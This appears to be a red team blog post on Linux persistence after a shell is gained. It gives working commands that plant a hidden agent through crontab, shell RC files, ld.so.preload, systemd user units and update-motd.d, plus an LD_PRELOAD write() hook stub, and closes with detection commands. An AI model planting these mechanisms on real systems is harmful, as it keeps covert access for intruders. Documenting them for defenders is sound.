LIVING IN /TMP: PERSISTENCE TRICKS EVERY RED TEAMER KNOWS

You've got a shell on a Linux box. Initial access is done. Now the real question: how do you make sure you still have access after a reboot, a session timeout, or a user logout?

This post covers the practical persistence techniques that show up in real red team engagements. They range from "trivially detectable if anyone looks" to "survives most automated detection." They're documented here for the same reason we document lock-picking: defenders need to know what they're up against.

1. Crontab

The oldest trick in the book. Still works.

# User-level crontab — no root required
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.update 2>/dev/null") | crontab -

# System-level — needs root
echo "*/5 * * * * root /tmp/.update 2>/dev/null" > /etc/cron.d/system-update

User crontabs live in /var/spool/cron/crontabs/USERNAME. The entries in /etc/cron.d/ require a username field between the schedule and the command — that's a difference that catches people.

Most EDR and SIEM tools alert on new cron entries. If you're on an engagement and cron trips an alert within minutes, consider that the blue team has a detection there and move on to less-monitored mechanisms.

2. Shell RC files

# Runs every time user opens an interactive bash shell
echo 'nohup /tmp/.agent -q &>/dev/null &' >> ~/.bashrc

# Runs on login shells
echo '/tmp/.agent &>/dev/null &' >> ~/.profile

# .bash_profile overrides .profile on login shells if it exists
echo '/tmp/.agent &>/dev/null &' >> ~/.bash_profile

Easy to plant, easy to spot. The value here is persistence against session timeouts — every time the user opens a terminal, your agent fires. On servers without interactive logins this doesn't help much.

3. LD_PRELOAD hijacking

LD_PRELOAD tells the dynamic linker to load your library before everything else. Your library's functions shadow glibc's. Classic use case: override open(), write(), execve() to log or intercept calls. 

# System-wide (root required) — every dynamically-linked process loads your SO
echo '/tmp/.libsys.so' > /etc/ld.so.preload

# User-level via .bashrc (no root needed)
echo 'export LD_PRELOAD=/home/user/.cache/.lib.so' >> ~/.bashrc

A system-wide ld.so.preload entry is powerful but very noisy from a forensics perspective — check the file and you see it immediately. The user-level variant only affects processes started from that user's shell session.

Building the malicious SO is straightforward: 

// evil.c — hooks write() to also exfiltrate to attacker
#define _GNU_SOURCE
#include <dlfcn.h>
#include <unistd.h>

ssize_t write(int fd, const void *buf, size_t count) {
    ssize_t (*orig_write)(int, const void*, size_t) = dlsym(RTLD_NEXT, "write");
    // exfil logic here
    return orig_write(fd, buf, count);
}
gcc -shared -fPIC -o evil.so evil.c -ldl

4. Systemd user units

This one gets overlooked because people don't think to look in user-space systemd. No root required. Survives reboot as long as lingering is enabled (which it often is on servers). 

mkdir -p ~/.config/systemd/user/

cat > ~/.config/systemd/user/updater.service <<EOF
[Unit]
Description=User Update Agent

[Service]
ExecStart=/tmp/.agent
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
EOF

systemctl --user daemon-reload
systemctl --user enable updater
systemctl --user start updater

Check if lingering is enabled for the user (allows services to run without an active login session): 

loginctl show-user $USER | grep Linger
# Linger=yes means it survives logout
# Enable lingering (as root)
loginctl enable-linger USERNAME

5. update-motd.d

On Debian/Ubuntu systems, /etc/update-motd.d/ contains scripts that run as root every time someone logs in via SSH. This is how the dynamic MOTD works. It's a free root shell execution on every SSH login. 

cat > /etc/update-motd.d/99-agent <<'EOF'
#!/bin/bash
/tmp/.agent &>/dev/null &
EOF
chmod +x /etc/update-motd.d/99-agent

Runs as root, triggered by SSH login, rarely audited. Check your MOTD scripts.

Detecting all of this

# 1. All user crontabs
for user in $(cut -f1 -d: /etc/passwd); do
    crontab -u "$user" -l 2>/dev/null | grep -v '^#' | sed "s/^/$user: /"
done

# 2. System cron directories
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.hourly/

# 3. ld.so.preload
cat /etc/ld.so.preload 2>/dev/null

# 4. Systemd user units across all users
find /home -path "*/.config/systemd/user/*.service" 2>/dev/null
find /root -path "*/.config/systemd/user/*.service" 2>/dev/null

# 5. Shell RC file backdoors
grep -r 'nohup\|LD_PRELOAD\|/tmp\|/dev/shm' /home/*/.bashrc /home/*/.profile \
    /root/.bashrc /root/.profile 2>/dev/null

# 6. MOTD scripts
ls -la /etc/update-motd.d/
cat /etc/update-motd.d/*

A note on /dev/shm

/tmp is obvious. /dev/shm is a RAM-backed tmpfs that's world-writable on most systems. Files there are wiped on reboot but survive process restarts. Malware operators use it because some log aggregators and scanners exclude it. Don't exclude it — scan it like you'd scan /tmp.
